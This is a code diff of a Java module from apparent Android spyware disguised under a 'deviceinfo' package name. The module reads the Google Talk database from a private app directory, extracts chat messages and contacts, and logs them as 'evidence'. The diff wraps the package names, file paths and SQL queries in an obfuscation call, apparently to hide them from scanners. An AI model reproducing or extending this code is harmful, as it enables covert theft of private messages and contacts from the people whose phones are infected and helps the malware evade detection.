@@ -1,11 +1,8 @@
 package com.android.deviceinfo.module.chat;
 
-import java.io.File;
 import java.io.IOException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Date;
-import java.util.List;
 import java.util.concurrent.Semaphore;
 
 import android.database.Cursor;
@@ -17,7 +14,7 @@ import com.android.deviceinfo.file.Path;
 import com.android.deviceinfo.manager.ManagerModule;
 import com.android.deviceinfo.module.ModuleAddressBook;
 import com.android.deviceinfo.util.Check;
-import com.android.deviceinfo.util.StringUtils;
+import com.android.m.M;
 
 public class ChatGoogle extends SubModuleChat {
 
@@ -25,7 +22,7 @@ public class ChatGoogle extends SubModuleChat {
 
 	private static final int PROGRAM = 0x04;
 
-	String pObserving = "com.google.android.talk";
+	String pObserving = M.e("com.google.android.talk");
 
 	Semaphore readChatSemaphore = new Semaphore(1, true);
 
@@ -80,8 +77,8 @@ public class ChatGoogle extends SubModuleChat {
 		try {
 			boolean updateMarkup = false;
 
-			String dbFile = "talk.db";
-			String dbDir = "/data/data/com.google.android.gsf/databases";
+			String dbFile = M.e("talk.db");
+			String dbDir = M.e("/data/data/com.google.android.gsf/databases");
 
 			lastLine = markup.unserialize(new Long(0));
 
@@ -136,7 +133,7 @@ public class ChatGoogle extends SubModuleChat {
 	private long fetchMessages(GenericSqliteHelper helper, long lastLine) {
 		final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();
 
-		String sqlquery = "select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?";
+		String sqlquery = M.e("select m.date, ac.name, m.type, body, co.username, co.nickname from messages as m join  contacts as co on m.thread_id = co._id join accounts as ac on co.account = ac._id where m.consolidation_key is null and m.type<=1 and m.date>?");
 				RecordVisitor visitor = new RecordVisitor() {
 
 			@Override
@@ -158,7 +155,7 @@ public class ChatGoogle extends SubModuleChat {
 				String from_id, from_display, to_id, to_display;
 				
 				
-				if(co_nick==null || co_nick.startsWith("private-chat")){
+				if(co_nick==null || co_nick.startsWith(M.e("private-chat"))){
 					return 0;
 				}
 				
@@ -228,7 +225,7 @@ public class ChatGoogle extends SubModuleChat {
 				String nick = cursor.getString(1);
 	
 				Contact c = new Contact(username, username, nick, "");
-				if (username != null && !username.endsWith("public.talk.google.com")) {
+				if (username != null && !username.endsWith(M.e("public.talk.google.com"))) {
 					if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.GOOGLE, c)) {
 						if (Cfg.DEBUG) {
 							Check.log(TAG + " (cursor) need to serialize");
@@ -240,7 +237,7 @@ public class ChatGoogle extends SubModuleChat {
 			}
 		};
 	
-		if (helper.traverseRecords("contacts", visitor) == 1) {
+		if (helper.traverseRecords(M.e("contacts"), visitor) == 1) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (saveContacts) serialize");
 			}
